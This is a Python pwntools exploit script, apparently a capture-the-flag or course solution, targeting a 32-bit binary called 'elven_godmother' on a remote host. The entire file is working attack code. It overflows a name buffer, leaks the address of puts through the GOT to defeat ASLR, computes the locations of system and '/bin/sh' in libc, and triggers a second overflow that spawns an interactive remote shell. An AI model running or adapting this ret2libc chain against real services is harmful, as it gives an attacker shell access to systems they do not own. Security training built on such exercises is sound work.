from pwn import *

BIN = './elven_godmother'
LIBC = './libc.so.6'
context.binary = BIN

e = ELF(BIN)
libc = ELF(LIBC)

# p = process(BIN)
p = remote('141.85.224.106', '31344')

p.recvline() # Skip the 'Find out your elven name and improve your love life considerably!\n' line
p.recvline() # Skip the '\n' line
p.recvuntil(b'What is your first name? ') # Skip the 'What is your first name? ' line

buffer_size = 0x100
buffer_offset = 0x10c
old_ebp_offset = 0x4
puts_plt_address = e.plt['puts']
puts_got_address = e.got['puts']
main_address = e.symbols['main']

buffer1_payload = b''
buffer1_payload += b'A' * buffer_size

p.send(buffer1_payload)

remaining_space_until_rbpx = buffer_offset - buffer_size + 1

p.recvuntil(b'What is your last name? ') # Skip the 'What is your last name? ' line

buffer2_payload = b''
buffer2_payload += b'A' * (remaining_space_until_rbpx + old_ebp_offset)
buffer2_payload += p32(puts_plt_address)
buffer2_payload += p32(main_address)
buffer2_payload += p32(puts_got_address)

p.sendline(buffer2_payload)

p.recvuntil(b'What is your gender? (m/f) ') # Skip the 'What is your gender? (m/f) ' line
p.sendline(b'm')

puts_address = u32(p.recvline()[:4].strip().ljust(4, b'\x00'))

libc.address = puts_address - libc.symbols['puts']
system_address = libc.symbols['system']
bin_sh_address = next(libc.search(b'/bin/sh'))

p.recvline() # Skip the 'Find out your elven name and improve your love life considerably!\n' line
p.recvline() # Skip the '\n' line
p.recvuntil(b'What is your first name? ') # Skip the 'What is your first name? ' line

p.send(buffer1_payload)

p.recvuntil(b'What is your last name? ') # Skip the 'What is your last name? ' line

buffer2_payload = b''
buffer2_payload += b'A' * (remaining_space_until_rbpx + old_ebp_offset)
buffer2_payload += p32(system_address)
buffer2_payload += p32(main_address)
buffer2_payload += p32(bin_sh_address)

p.sendline(buffer2_payload)

p.recvuntil(b'What is your gender? (m/f) ') # Skip the 'What is your gender? (m/f) ' line
p.sendline(b'm')

p.interactive()
